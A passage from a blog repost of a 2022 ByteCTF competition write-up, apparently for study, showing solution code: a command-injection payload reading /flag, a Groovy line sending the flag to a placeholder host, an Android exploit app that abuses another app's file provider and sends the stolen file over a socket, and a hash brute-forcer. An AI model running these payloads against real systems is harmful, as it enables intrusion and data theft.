&#x27;SW2YcwTIb9zpO1hoPsMm&#x27;ciphertext = &#x27;b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/&#x27;encrypted = base64.b64decode(ciphertext.encode())pwdBytes, _ = decrypt(encrypted, secret_key)print(pwdBytes)</span><br><span class="line">arr[$(cat /flag)]</span><br><span class="line">def f = new File(&quot;/flag&quot;).textdef res1 = new URL(&#x27;http://ip:</span><br><span class="line">1234/1&#x27;+f).text</span><br><span class="line">https://www.howtoing.com/how-to-monitor-your-ubuntu-16-04-system-with-sysdig/</span><br><span class="line">https://forum.butian.net/share/1175</span><br><span class="line">https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/</span><br><span class="line">package com.bytectf.pwnbronzedroid;</span><br><span class="line">import android.app.Activity;</span><br><span class="line">import android.content.ContentValues;</span><br><span class="line">import android.content.Intent;</span><br><span class="line">import android.net.Uri;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.provider.MediaStore;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import android.widget.Toast;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.net.InetSocketAddress;</span><br><span class="line">import java.net.Socket;</span><br><span class="line">import java.net.SocketAddress;</span><br><span class="line">public class MainActivity extends Activity &#123;// 参考 https://forum.butian.net/share/1175 @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); Intent intent = new Intent(&quot;ACTION_SHARET_TO_ME&quot;); intent.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); // 这里往后参考 https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/ intent.setClassName(&quot;com.bytectf.bronzedroid&quot;, &quot;com.bytectf.bronzedroid.MainActivity&quot;); intent.setData(Uri.parse(&quot;content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag&quot;)); startActivityForResult(intent,0); &#125;</span><br><span class="line"></span><br><span class="line">// 这部分参考 https://forum.butian.net/share/1175 对onActivityResult 进行魔改 protected void onActivityResult(int requestCode, int resultCode, Intent data) &#123; super.onActivityResult(requestCode, resultCode, data); try &#123; InputStream is = getContentResolver().openInputStream(data.getData()); BufferedReader br = new BufferedReader(new InputStreamReader(is)); StringBuilder sb = new StringBuilder(); String line; while ((line = br.readLine()) != null) &#123; sb.append(line); &#125; is.close(); br.close(); String flag = sb.toString(); new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; if (true) &#123; Socket sk = new Socket(); SocketAddress address = new InetSocketAddress(&quot;ip&quot;, 1235); sk.connect(address, 5000); sk.setTcpNoDelay(true); sk.setKeepAlive(true); OutputStream os = sk.getOutputStream(); os.write(flag.getBytes()); os.flush(); os.close(); sk.close(); Thread.sleep(1000); &#125; &#125; catch (Exception e) &#123; Log.e(&quot;FlagHunter_Err&quot;,e.toString()); &#125; &#125; &#125;).start(); &#125; catch ( Exception e) &#123; throw new RuntimeException(e); &#125; &#125;&#125;</span><br><span class="line">from hashlib import *import itertoolsimport stringfrom Crypto.Hash import SHA256import itertoolsALPHABET = string.ascii_letters + string.digitssuffix = &#x27;Zfecpd&#x27;digest = &#x27;5782089877f9ff411d7d6276df447eca181fc5a27dc3fadc5a0d68a0aa555581&#x27;print(f&quot;suffix: &#123;suffix&#125;ndigest: &#123;digest&#125;&quot;)for i in itertools.product(ALPHABET,repeat=4): prefix = &#x27;&#x27;.join(i) guess = suffix + prefix if sha256(guess.encode()).hexdigest() == digest: print(f&quot;Find XXXX: &#123;prefix&#125;&quot;) break</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/59101.html">https://www.ctfiot.com/59101.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2022_ByteCTF_By_EDISEC.full.md">CTF大赛WP集合&#x2F;articles&#x2F;2022_ByteCTF_By_EDISEC.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQLi-users-signup/">SQLi-users-signup</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Web/2022_WMCTF-wp/" title="2022 WMCTF WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022 WMCTF WP</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Web/2022_pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B_writeup_by_Arr3stY0u/" title="2022 pwnhub 冬季赛 writeup by Arr3stY0u"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022 pwnhub 冬季赛 writeup by Arr3stY0u</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
